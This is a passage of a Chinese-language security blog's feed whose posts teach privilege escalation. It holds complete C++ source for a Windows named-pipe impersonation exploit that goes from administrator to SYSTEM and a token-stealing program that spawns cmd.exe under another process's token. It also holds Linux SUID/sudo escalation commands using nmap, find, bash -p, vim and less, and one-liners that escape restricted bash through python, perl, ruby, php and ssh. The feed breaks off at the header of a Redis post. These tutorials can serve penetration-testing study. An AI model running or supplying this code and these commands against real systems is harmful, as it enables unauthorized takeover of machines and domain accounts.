class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">LPCWSTR pipeName &#x3D; L&quot;\\\\.\\pipe\\testpipe&quot;;</span><br><span class="line">LPVOID pipeBuffer &#x3D; NULL;</span><br><span class="line">HANDLE serverPipe;</span><br><span class="line">DWORD readBytes &#x3D; 0;</span><br><span class="line">DWORD readBuffer &#x3D; 0;</span><br><span class="line">int err &#x3D; 0;</span><br><span class="line">BOOL isPipeConnected;</span><br><span class="line">BOOL isPipeOpen;</span><br><span class="line">wchar_t message[] &#x3D; L&quot;HELL&quot;;</span><br><span class="line">DWORD messageLenght &#x3D; lstrlen(message) * 2;</span><br><span class="line">DWORD bytesWritten &#x3D; 0;</span><br><span class="line">WCHAR message2[512] &#x3D; &#123; 0 &#125;;</span><br><span class="line">&#x2F;&#x2F;Open a Named Pipe,Wait for a connection</span><br><span class="line">std::wcout &lt;&lt; &quot;Creating named pipe &quot; &lt;&lt; pipeName &lt;&lt; std::endl;</span><br><span class="line">serverPipe &#x3D; CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Create a service of system to connect to our NamedPipe.</span><br><span class="line"></span><br><span class="line">char servicename[] &#x3D; &quot;Service.exe&quot;;</span><br><span class="line">char servicepath[_MAX_PATH];</span><br><span class="line">SERVICE_STATUS status;</span><br><span class="line">GetModuleFileNameA(LoadLibraryA(servicename), servicepath, sizeof(servicepath));</span><br><span class="line">SC_HANDLE scManager &#x3D; OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">if (GetLastError() &#x3D;&#x3D; 0) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;ERROR OpenSCManager:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">SC_HANDLE scService &#x3D; CreateServiceA(scManager, servicename, servicename,</span><br><span class="line">SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,</span><br><span class="line">servicepath, NULL, NULL, NULL, NULL, NULL);</span><br><span class="line">if (!scService) &#123;</span><br><span class="line">if (GetLastError() &#x3D;&#x3D; 1073) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;The Service has been exsisted&quot; &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;ERROR CreateServiceA:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">SC_HANDLE scServiceA &#x3D; OpenServiceA(scManager, servicename, SERVICE_ALL_ACCESS);</span><br><span class="line">if (StartService(scServiceA, 0, NULL)) &#123;</span><br><span class="line">std::cout&lt;&lt;&quot;service Start success&quot;&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">if (GetLastError() &#x3D;&#x3D; 1056) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;service is running,don&#39;t need to start again&quot; &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;Connect !</span><br><span class="line">isPipeConnected &#x3D; ConnectNamedPipe(serverPipe, NULL);</span><br><span class="line"></span><br><span class="line">if (isPipeConnected) &#123;</span><br><span class="line">std::wcout &lt;&lt; &quot;Incoming connection to &quot; &lt;&lt; pipeName &lt;&lt; std::endl;</span><br><span class="line">ReadFile(serverPipe, &amp;message2, 512, &amp;bytesWritten, NULL);</span><br><span class="line">std::cout &lt;&lt; message2;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;Does not connected Error: &quot;&lt;&lt;GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::wcout &lt;&lt; &quot;Sending message: &quot; &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">WriteFile(serverPipe, message, messageLenght, &amp;bytesWritten, NULL);</span><br><span class="line">&#x2F;&#x2F;Toekn Impersonation</span><br><span class="line">std::wcout &lt;&lt; &quot;Impersonating the client...&quot; &lt;&lt; std::endl;</span><br><span class="line">if (!ImpersonateNamedPipeClient(serverPipe)) &#123;</span><br><span class="line">std::cout&lt;&lt;&quot;ImpersonateNamedPipeClient ERROR: &quot;&lt;&lt;GetLastError()&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;ImpersonateNamedPipeClient success&quot; &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">STARTUPINFOA si;</span><br><span class="line">PROCESS_INFORMATION pi &#x3D; &#123;&#125;;</span><br><span class="line">ZeroMemory(&amp;pi, sizeof(pi));</span><br><span class="line">ZeroMemory(&amp;si, sizeof(si));</span><br><span class="line">si.cb &#x3D; sizeof(si);</span><br><span class="line">HANDLE token;</span><br><span class="line">if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;token)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;GetCurrentThread ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CHAR command1[] &#x3D; &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;;</span><br><span class="line">WCHAR command2[] &#x3D; L&quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;;</span><br><span class="line">HANDLE Token;</span><br><span class="line">if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS,NULL, SecurityImpersonation, TokenImpersonation,&amp;Token)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;DuplicateTokenEx ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;Impersonate completed&quot; &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">if (!CreateProcessAsUserA(token, NULL, command1, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;CreateProcessAsUserA ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt;&quot; Now Use CreateProcessWithTokenW&quot;&lt;&lt; std::endl;</span><br><span class="line">if (!CreateProcessWithTokenW(token, LOGON_NETCREDENTIALS_ONLY, NULL, command2, NULL, NULL, NULL, (LPSTARTUPINFOW)&amp;si, &amp;pi)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;CreateProcessWithTokenW ERROR:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;CreateProcessWithTokenW success&quot; &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;CreateProcessWithTokenW success&quot; &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">while(1)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们生成了Service.exe,然后把他移到Server.exe同级目录，以管理员权限运行Server.exe,即可达到admin-》system的提权。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144553.png" alt="QQ截图20210217144553"></p><p>程序写了四天终于写好了。。WIN7下可以实现完美提权。<br>项目地址:<a href="https://github.com/ConsT27/EvilNamedPipe/tree/1.0">https://github.com/ConsT27/EvilNamedPipe/tree/1.0</a></p><h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>SYSTEM-&gt;本机上其他用户（包括域用户）(好家伙，只要本机有system权限，域管敢在本机上创建进程就直接能拿到域管权限） 或者admin获取debug权限后去获取SYSTEM权限（这里有一个细节点，只有owner为administrator的SYSTEM进程才能被利用，比如lsass，dllhost)</p><p>技术细节:通过寻找高权限开启的进程，再复制其令牌用以创建新进程，即可达到提权目的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Only administrator can get debug priv</span><br><span class="line">BOOL GetDebugPriv() &#123;</span><br><span class="line">HANDLE Token;</span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line">LUID Luid;</span><br><span class="line">if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;Token)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;OpenProcessToken ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tp.PrivilegeCount &#x3D; 1;</span><br><span class="line">tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;</span><br><span class="line">if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;Luid)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;LookupPrivilegeValue ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">tp.Privileges[0].Luid &#x3D; Luid;</span><br><span class="line">if (!AdjustTokenPrivileges(Token, FALSE, &amp;tp, sizeof(tp), NULL, NULL) )&#123;</span><br><span class="line">std::cout &lt;&lt; &quot;AdjustTokenPrivileges ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">if (GetLastError() &#x3D;&#x3D; ERROR_NOT_ALL_ASSIGNED) &#123;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">HANDLE t_process;</span><br><span class="line">HANDLE token &#x3D; NULL;</span><br><span class="line">HANDLE token_bak &#x3D; NULL;</span><br><span class="line">DWORD process_id;</span><br><span class="line">sscanf_s(argv[1], &quot;%ul&quot;, &amp;process_id);</span><br><span class="line">WCHAR command[] &#x3D; L&quot;C:\\Windows\\System32\\cmd.exe&quot;;</span><br><span class="line">STARTUPINFO startupInfo;</span><br><span class="line">PROCESS_INFORMATION processInformation;</span><br><span class="line">ZeroMemory(&amp;startupInfo, sizeof(STARTUPINFO));</span><br><span class="line">ZeroMemory(&amp;processInformation, sizeof(PROCESS_INFORMATION));</span><br><span class="line">startupInfo.cb &#x3D; sizeof(STARTUPINFO);</span><br><span class="line">std::cout &lt;&lt; argv[1] &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &quot;Openning process PID:&quot; &lt;&lt; process_id &lt;&lt; std::endl;</span><br><span class="line">if (GetDebugPriv()&#x3D;&#x3D; TRUE) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;Got the debug priv&quot; &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;GetDebugPriv ERROR&quot; &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">system(&quot;whoami &#x2F;priv&quot;);</span><br><span class="line">t_process &#x3D; OpenProcess(PROCESS_ALL_ACCESS, true, process_id);</span><br><span class="line">if (!t_process) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;OpenProcess ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">if (!OpenProcessToken(t_process, TOKEN_ALL_ACCESS, &amp;token)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;OpenProcessToken ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;token_bak)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;DuplicateTokenEx ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">if (!CreateProcessWithTokenW(token_bak, LOGON_WITH_PROFILE, NULL, command, 0, NULL, NULL, &amp;startupInfo, &amp;processInformation)) &#123;</span><br><span class="line">std::cout &lt;&lt; &quot;CreateProcessWithTokenW ERROR&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144620.png" alt="QQ截图20210217144620"></p><p>这是在win7下的测试结果 const\administrator 是域控</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;无引号服务路径-（-Trusted-Service-Paths-）&quot;&gt;&lt;a href=&quot;#无引号服务路径-（-Trusted-Service-Paths-）&quot; class=&quot;headerlink&quot; title=&quot;无引号服务路径 （ Trusted Service </summary>
      
    
    
    
    
    <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux sudo与suid提权</title>
    <link href="http://yoursite.com/2021/02/19/Linux%20sudo%E6%8F%90%E6%9D%83%E4%B8%8Esuid%E6%8F%90%E6%9D%83/"/>
    <id>http://yoursite.com/2021/02/19/Linux%20sudo%E6%8F%90%E6%9D%83%E4%B8%8Esuid%E6%8F%90%E6%9D%83/</id>
    <published>2021-02-19T09:21:51.307Z</published>
    <updated>2021-02-19T08:50:47.820Z</updated>
    
    <content type="html"><![CDATA[<h2 id="何为suid"><a href="#何为suid" class="headerlink" title="何为suid"></a>何为suid</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145316.png" alt="QQ截图20210217145316"></p><p>可见在权限位置有一个s权限。那么这个s的作用是什么呢？<br>答案是当其他用户执行该文件时，该文件会以root的身份执行。<br>这里就涉及到了Effective UID和Real UID以及Saved UID<br>Effective UID: 程序实际操作时生效的UID<br>Real UID: 执行该程序的用户的实际UID<br>Saved UID: 在高权限用户降权后，保留的其原本UID (不展开说)</p><p>所以增加了一个s权限，该程序在实际运行时Effective UID就会变为0，即root的UID</p><h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><p>就是能把一个命令视作root来执行,用sudo-l查看可以被sudo的命令</p><h2 id="SUID与sudo提权"><a href="#SUID与sudo提权" class="headerlink" title="SUID与sudo提权"></a>SUID与sudo提权</h2><h3 id="遍历目录中的suid文件"><a href="#遍历目录中的suid文件" class="headerlink" title="遍历目录中的suid文件"></a>遍历目录中的suid文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>执行该命令，会得到所有suid文件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145327.png" alt="QQ截图20210217145327"></p><h3 id="用sudo-l-查看哪些命令能被sudo"><a href="#用sudo-l-查看哪些命令能被sudo" class="headerlink" title="用sudo -l 查看哪些命令能被sudo"></a>用sudo -l 查看哪些命令能被sudo</h3><h3 id="可利用于提权的命令"><a href="#可利用于提权的命令" class="headerlink" title="可利用于提权的命令"></a>可利用于提权的命令</h3><h5 id="1-nmap"><a href="#1-nmap" class="headerlink" title="1.nmap"></a>1.nmap</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure><p>使用nmap的udp或tcp syn扫描时，需要用到root权限，所以有些管理员图方便会直接给namp上s权限，而nmap 5.20(使用nmap -v查看nmap版本)之前有一个interactive交互模式(nmap –interactive)，在nmap effective uid为0时，可以通过这个模式获得root权限交互式命令行，成功提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;os.execute(&#39;&#x2F;bin&#x2F;bash&#39;)&quot; &gt; .&#x2F;shell</span><br><span class="line">nmap --script&#x3D;shell</span><br></pre></td></tr></table></figure><p>全版本通杀提权，利用nmap可以执行指定文件的特点提权</p><h5 id="2-find"><a href="#2-find" class="headerlink" title="2.find"></a>2.find</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -exec command</span><br></pre></td></tr></table></figure><p>find命令自带-exec参数，可以执行命令，若find有suid权限，那么使用exec相当于直接提权到root.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读文件 find &#x2F;path -exec &#123;&#125; \;</span><br></pre></td></tr></table></figure><h5 id="3-vim"><a href="#3-vim" class="headerlink" title="3.vim"></a>3.vim</h5><p>vim有了suid就可以任意文件读取了</p><p>同时也可以输入</p><p><img src="http://www.const27.com/wp-content/uploads/2020/07/%E5%9B%BE%E7%89%87-6.png" alt="img"></p><p>来获取root shell</p><h5 id="4-bash"><a href="#4-bash" class="headerlink" title="4.bash"></a>4.bash</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p  开启一个新shell，suid的话自然是开启root shell</span><br></pre></td></tr></table></figure><h5 id="5-less，more"><a href="#5-less，more" class="headerlink" title="5.less，more"></a>5.less，more</h5><p>和vim差不多，任意文件读取，同时也可以输入 !command 进行提权到root</p><h5 id="6-exim"><a href="#6-exim" class="headerlink" title="6.exim"></a>6.exim</h5><p>exim在特定版本下会有suid提权</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145341.png" alt="QQ截图20210217145341"></p><p>下载exp打就完事了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;何为suid&quot;&gt;&lt;a href=&quot;#何为suid&quot; class=&quot;headerlink&quot; title=&quot;何为suid&quot;&gt;&lt;/a&gt;何为suid&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://const27blog.oss-cn-beijing.aliyuncs.</summary>
      
    
    
    
    
    <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux rbash绕过</title>
    <link href="http://yoursite.com/2021/02/19/Linux%20rbash%E7%BB%95%E8%BF%87/"/>
    <id>http://yoursite.com/2021/02/19/Linux%20rbash%E7%BB%95%E8%BF%87/</id>
    <published>2021-02-19T09:21:51.306Z</published>
    <updated>2021-02-19T08:50:49.780Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="何为rbash"><a href="#何为rbash" class="headerlink" title="何为rbash"></a>何为rbash</h2><p>rbash，是出于安全性考虑的一个功能受限的bash，我在vulnhub dc-2首次接触,他的限制性可能会有如下.</p><ul><li>cd 切换目录</li><li>含有斜杠 <code>/</code> 的命令, 譬如 <code>/bin/sh</code></li><li>设置 PATH ENV 等环境变量</li><li>使用 <code>&gt;</code> <code>&lt;</code> 进行重定向</li><li>binary 的运行. 通常 root 用户会手动创建 <code>/bin/binary_file -&gt; /home/rbash_user/bin/binary_file</code> 的软链接, 限制性地提供部分 binary_file 给 rbash_user 使用 在 bash 下 <code>echo $SHELL</code>, 可以获取当前环境是否是 rbash.</li></ul><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="scp-bypass"><a href="#scp-bypass" class="headerlink" title="scp bypass"></a>scp bypass</h3><p>我在<a href="http://www.const27.com/2020/07/02/vulnhub-dc-2/%E5%B0%B1%E6%98%AF%E7%94%A8scp%E7%BB%95%E7%9A%84">http://www.const27.com/2020/07/02/vulnhub-dc-2/就是用scp绕的</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145419.png" alt="QQ截图20210217145419"></p><h2 id="进入命令自带shell-bypass"><a href="#进入命令自带shell-bypass" class="headerlink" title="进入命令自带shell bypass"></a>进入命令自带shell bypass</h2><p>man,git config help,more,less,vim,vi,ftp,gdb等命令都有自己的shell，我们只需在他们各自的shell中执行/bin/sh即可<br>一般都是在shell键入!/bin/sh来bypass rbash</p><p>下面这种方法也是可行的（似乎仅vim)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>执行上面两个语句，就bypass了</p><h2 id="find-bypasss"><a href="#find-bypasss" class="headerlink" title="find bypasss"></a>find bypasss</h2><p>简单概括就是-exec执行一下/bin/bash …</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145437.png" alt="QQ截图20210217145437"></p><h2 id="编程语言-bypass"><a href="#编程语言-bypass" class="headerlink" title="编程语言 bypass"></a>编程语言 bypass</h2><p>python</p><p>如果python都可以用的话，那就更轻松了，os安排一下<br>似乎pty也行?没试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os;os.system(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure><p>php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -a 进入php shell</span><br><span class="line">然后执行命令:exec(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br></pre></td></tr></table></figure><p>perl</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;</span><br></pre></td></tr></table></figure><p>ruby</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;&#39;</span><br></pre></td></tr></table></figure><h2 id="cp-bypass"><a href="#cp-bypass" class="headerlink" title="cp bypass"></a>cp bypass</h2><p>直接用cp把/usr/bin里的命令复制过来就行了</p><h2 id="直接更改PATH-SHELL变量"><a href="#直接更改PATH-SHELL变量" class="headerlink" title="直接更改PATH/SHELL变量"></a>直接更改PATH/SHELL变量</h2><p>键入export -p 查看该用户的变量</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145455.png" alt="QQ截图20210217145455"></p><p>如果这俩变量有w权，那么我们可以直接写入来bypass</p><h2 id="ssh-bypass"><a href="#ssh-bypass" class="headerlink" title="ssh bypass"></a>ssh bypass</h2><p>原理是通过ssh链接当前IP的当前用户并启动/bin/bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh username@Ip -t &quot;&#x2F;bin&#x2F;bash&quot;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;h2 id=&quot;何为rbash&quot;&gt;&lt;a href=&quot;#何为rbash&quot; class=&quot;headerlink&quot; title=&quot;何为rbash&quot;&gt;&lt;/a&gt;何为rbas</summary>
      
    
    
    
    
    <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>redis未授权</title>
    <link href="http://yoursite.com/2021/02/19/redis%E6%9C%AA%E6%8E%88%E6%9D%83/"/>
    <id>http://yoursite.com/2021/02/19/redis%E6%9C%AA%E6%8E%88%E6%9D%83/</id>
    <published>2021-02-19T09:21:48.993Z</published>
    <updated>2021-02-19T08:50:34.477Z</updated>
    
